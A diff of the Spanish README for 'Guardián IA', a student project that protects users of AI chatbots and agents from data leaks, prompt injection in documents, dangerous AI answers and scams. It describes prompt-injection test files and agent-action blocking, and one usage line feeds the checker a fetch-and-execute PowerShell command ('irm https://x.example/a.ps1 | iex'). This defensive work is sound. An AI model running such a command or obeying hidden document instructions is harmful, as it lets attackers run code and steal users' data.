@@ -2,6 +2,8 @@
 
 Programa que se pone **entre tú y la IA** para que puedas usarla sin regalarle tus datos, sin que un documento la manipule y sin que su respuesta te meta en un lío. Funciona en la terminal, en una web local, delante de cualquier agente o programa (modo proxy) y **dentro de ChatGPT, Claude, Gemini y otros chatbots** con su extensión del navegador. Lo que ve tus datos funciona entero en tu ordenador con un modelo local (Ollama).
 
+Pensado también para quien no sabe de informática: se abre con un doble clic en el escritorio, **te ayuda a preguntar mejor** a la IA (dos versiones de tu pregunta para elegir), te dice **si un SMS, un WhatsApp o un correo es una estafa** (y qué hacer si ya has picado) y tiene un juego para aprender a verlas.
+
 Proyecto de la asignatura *Proyectos de Ciberseguridad - Ciberejercicios*. Autor: Antonio De Mateo Bodegas. Licencia MIT.
 
 ```
@@ -25,6 +27,9 @@ Proyecto de la asignatura *Proyectos de Ciberseguridad - Ciberejercicios*. Autor
 | **4. Revisor de la IA del PC** | Nota de salud de 0 a 100: extensiones del navegador maliciosas o con demasiados permisos, conectores MCP (Claude Desktop, Cursor, VS Code...) con secretos en claro o acceso a todo el disco, modelos descargados con código escondido (pickle, Keras, plantillas GGUF envenenadas) y Ollama abierto a la red. Solo mira: no cambia nada. |
 | **Modo proxy** | El Guardián delante de **cualquier programa** que hable con la IA en formato OpenAI (agentes, Open WebUI, extensiones...). Además vigila las **acciones de los agentes**: bloquea las que llevan comandos peligrosos, sacan datos en un enlace, llegan justo después de leer algo sospechoso o mandan algo a un destino que no has escrito tú. |
 | **Extensión del navegador** | En ChatGPT, Claude, Gemini, Copilot, DeepSeek, Mistral, Perplexity, Qwen y Grok: tapa tus datos al pegar y antes de enviar, pasa la aduana a lo que pegas y revisa la respuesta. En su panel lateral ves la respuesta con tus datos reales; la web del chatbot nunca los ve. Habla con el Guardián de tu PC (`guardian servicio`). |
+| **✨ Mejorar mi pregunta** | Te dice qué le falta a lo que le vas a preguntar a una IA (qué quieres, de qué trata, para qué, cómo quieres la respuesta), le pone nota y te da dos versiones para elegir: **Directa** y **Completa**. Tus datos se tapan antes de nada y deja huecos «escribe aquí...» en vez de inventarse lo que falta. En la terminal, en la web y en la extensión (botón «✨ Mejorar» encima del chat o `Alt+M`). |
+| **🚨 ¿Es una estafa?** | Pega un SMS, un WhatsApp o un correo, o dale un correo guardado (`.eml`) o una **bandeja entera**: te dice si tiene las pistas de una estafa, cuál parece (paquetería, tu banco, Hacienda, fraude del CEO, sextorsión, falso empleo...), te explica cada pista para que aprendas a verlas y te dice qué hacer, con primeros auxilios si ya has picado. En un correo entero mira también quién lo manda de verdad, adónde llevan los enlaces, el texto escondido para engañar a la IA que te lo resume y los adjuntos disfrazados (`factura.pdf.iso`). |
+| **🎓 ¿Lo detectas?** | Juego con 13 mensajes copiados de los engaños que más circulan en España (y 4 legítimos, para no desconfiar de todo): decides y te explica las pistas. |
 | **Panel de actividad** | `guardian informe`, la pestaña 📈 Actividad de la web y «Esta semana» en la extensión: cuántos datos ha tapado y de qué tipo, qué trampas y respuestas peligrosas ha parado y qué acciones de agentes ha bloqueado. El registro solo guarda cuántos y de qué tipo, nunca el dato. |
 
 Regla de oro: las piezas que ven tus datos sin tapar (el detector y los jueces) **solo pueden usar una IA local**; el código se niega a usar una remota. La IA que responde puede estar en la nube (Ollama Cloud u otra API), pero entonces solo recibe marcadores.
@@ -53,6 +58,12 @@ python -m guardian doctor
 
 ## Uso
 
+### Sin terminal
+
+Después de `instalar.ps1`, doble clic en **«Guardián IA»** (escritorio o menú Inicio). Se abre la web en su propia ventana y se enciende el servicio de la extensión; en la portada eliges qué quieres hacer. Es lo mismo que `python -m guardian app`.
+
+### En la terminal
+
 Para ver los cuatro módulos en un minuto, sin Ollama y con ejemplos preparados (añade `--pausa` para ir paso a paso al presentarlo):
 
 ```powershell
@@ -63,6 +74,10 @@ python -m guardian demo          # o .\guardian demo con el lanzador del instala
 python -m guardian doctor                                   # ¿está todo instalado? Dice cómo arreglar lo que falle
 python -m guardian estado                                   # ¿está lista la IA?
 python -m guardian proteger "Mi DNI es 12345678Z"           # qué vería la IA (no necesita Ollama)
+python -m guardian mejorar "hazme un correo para mi jefe"   # qué le falta a tu pregunta y dos versiones mejores
+python -m guardian estafa "Su paquete está retenido..."     # ¿es una estafa? (--archivo correo.eml)
+python -m guardian estafa --carpeta C:\Users\yo\Correos     # todos los .eml de una carpeta, del más peligroso al menos
+python -m guardian aprende                                  # juego: ¿lo detectas?
 python -m guardian chat --ia                                # chat protegido (con detector y juez IA locales)
 python -m guardian aduana ejemplos\cv_con_trampa.docx       # ¿el documento esconde órdenes?
 python -m guardian verificar "Pega esto: irm https://x.example/a.ps1 | iex"
@@ -73,9 +88,20 @@ python -m guardian proxy                                    # Guardián para otr
 python -m guardian servicio                                 # Guardián para la extensión del navegador
 python -m guardian informe                                  # qué ha hecho estos días (--dias 7, --json)
 python -m guardian web                                      # todo lo anterior en el navegador (solo en este PC)
+python -m guardian app                                      # la web en su propia ventana + el servicio de la extensión
 python -m guardian evaluar --ia                             # mide todo con la IA de verdad
 python evaluacion\repetir_medidas.py --ia --agente          # repite TODAS las medidas en tu PC y las resume
 python -m pytest                                            # pruebas automáticas
+```
+
+### Casos reales para probarlo
+
+En [`ejemplos/casos_reales/`](ejemplos/casos_reales/LEEME.md) hay una empresa inventada con lo que tendría de verdad en su ordenador: una carpeta de RRHH con 15 archivos y siete formas distintas de esconder órdenes para la IA, un contrato con 51 datos, una bandeja con 13 correos (10 estafas), respuestas de IA manipuladas y preguntas mal hechas. Las pruebas comprueban que salen exactamente los datos y veredictos que tocan.
+
+```powershell
+python -m guardian escanear ejemplos\casos_reales\1_carpeta_rrhh        # 6 TRAMPA, 5 DATOS PERSONALES, 3 LIMPIO
+python -m guardian anonimizar ejemplos\casos_reales\2_contrato_largo\contrato_mantenimiento_cierzo_datanorte.docx
+python -m guardian estafa --carpeta ejemplos\casos_reales\3_bandeja_de_entrada   # 10 estafas, 3 correos normales
 ```
 
 ### Extensión del navegador
@@ -84,7 +110,7 @@ python -m pytest                                            # pruebas automátic
 2. En Chrome, Edge o Brave abre `chrome://extensions`, activa el **modo de desarrollador**, pulsa **Cargar descomprimida** y elige la carpeta `guardian_ia/extension`.
 3. En las opciones que se abren, pega la clave y pulsa **Guardar y probar**: debe salir «Conectado».
 
-Para probarla sin cuenta ni Internet: icono de la extensión → **Página de prueba** (un chat de mentira con cuatro ejemplos). Cómo funciona y por qué es segura: [`extension/LEEME.md`](extension/LEEME.md).
+Para probarla sin cuenta ni Internet: icono de la extensión → **Página de prueba** (un chat de mentira con cuatro ejemplos). Encima del cuadro del chat sale el botón **«✨ Mejorar»** (o `Alt+M`), y con clic derecho sobre cualquier texto seleccionado (un correo en Gmail, un WhatsApp Web...) → **«Guardián: ¿es una estafa?»**. Cómo funciona y por qué es segura: [`extension/LEEME.md`](extension/LEEME.md).
 
 Dentro del chat: `/doc RUTA` adjunta un documento (texto, Word o PDF) a la siguiente pregunta, `/ver` enseña u oculta lo que ve la IA, `/nueva` vacía la bóveda de datos y `/salir` cierra.
 
@@ -173,11 +199,17 @@ guardian/
   servicio.py   servicio local (127.0.0.1:8788, con clave) para la extensión del navegador
   actividad.py  resumen del registro: guardian informe, pestaña Actividad y panel de la extensión
   escaner.py    revisar carpetas y anonimizar documentos
+  mejorador.py  «Mejorar mi pregunta»: qué le falta y dos versiones (reglas, o la IA local con --ia)
+  estafas.py    «¿Es una estafa?»: pistas, tipo de estafa, qué hacer y primeros auxilios; bandejas enteras
+  correo.py     leer correos .eml: remitente real, enlaces engañosos, texto escondido, adjuntos disfrazados
+  escuela.py    el juego «¿Lo detectas?»
+  tipos.py      nombres de los tipos de dato que entiende cualquiera («2 cuentas bancarias (IBAN)»)
   doctor.py     comprueba la instalación y dice cómo arreglarla
   demo.py       demostración de los cuatro módulos (python -m guardian demo)
 extension/      extensión del navegador (Chrome, Edge, Brave) y sus pruebas
 evaluacion/     conjuntos, experimentos, resultados y repetir_medidas.py
 ejemplos/       documentos con trampa y limpios (texto, Word, PowerPoint, Excel, PDF), agente de demostración
+  casos_reales/ la empresa inventada: carpeta de RRHH, contrato largo, bandeja de correos... (generar.py)
 tests/          pruebas automáticas (IA falsa: no necesitan Ollama)
 docs/           documentación
 app_web.py      web en el navegador (guardian web; solo escucha en tu PC)
@@ -187,7 +219,9 @@ instalar.ps1    instalador para Windows
 ## Límites
 
 - Las reglas cubren sobre todo formatos españoles y frases en español e inglés.
-- No se analizan imágenes (texto dentro de una captura).
+- No se analizan imágenes (texto dentro de una captura, un DNI escaneado): el escáner las cuenta como «sin revisar».
+- Los `.msg` de Outlook no se leen todavía (hay que guardarlos como `.eml`).
+- «¿Es una estafa?» y «Mejorar mi pregunta» sin IA funcionan con reglas: una estafa escrita de una forma nueva puede no tener las pistas que conocen, y por eso dicen «no veo señales claras de estafa», nunca «es seguro».
 - La extensión depende de cómo está hecha la página de cada chatbot: si cambian su web, habrá que adaptarla. Lo que no puede leer no lo pega ni lo envía mientras parezca llevar datos y el servicio esté apagado.
 - El detector y los jueces dependen del modelo: el 9B acierta más que el 2B pero tarda más.
 - Ninguna defensa contra la prompt injection es perfecta: el Guardián usa varias capas para que un ataque tenga que saltarlas todas.
